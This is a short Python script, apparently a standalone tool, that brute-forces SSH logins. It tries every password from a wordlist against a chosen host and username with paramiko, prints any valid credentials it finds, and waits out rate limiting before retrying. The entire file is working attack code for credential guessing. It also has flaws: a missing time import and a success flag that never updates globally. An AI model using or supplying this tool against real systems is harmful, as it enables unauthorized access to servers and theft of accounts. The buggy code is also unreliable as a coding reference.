
#SSH bruteforcer

import paramiko
import socket
from colorama import init, Fore
import argparse
import sys

init()

GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
RESET = Fore.RESET

valid = 0

def isSSHopen(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, password=password, username=username,look_for_keys=False,allow_agent=False, timeout=1, auth_timeout=3, banner_timeout=60)
    except paramiko.AuthenticationException:
        print(f"{RED}[!] Bad username or password! [-] {password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[-] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return isSSHopen(hostname, username, password)
    except socket.error:
        print(f"[-] Host is unreachable!{RESET}")
        return False
    else:
        print(f"{GREEN}[+] VALID CREDENTIALS FOUND {username}:{password}")
        valid = 1
        return True

def sshBrute(passwordfile):
    with open(passwordfile) as file:
        lines = file.read().splitlines()
    for passw in lines:
        isSSHopen(args.host,args.username,passw)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="SSH bruteforcer")
    parser.add_argument('host',type=str ,help='Sepcify the target')
    parser.add_argument('-P', '--passwordfile', help='File that stores passwords')
    parser.add_argument('-u','--username',type = str, help="Username")
    args = parser.parse_args()

sshBrute(args.passwordfile)
if valid == 1:
    sys.exit(0)
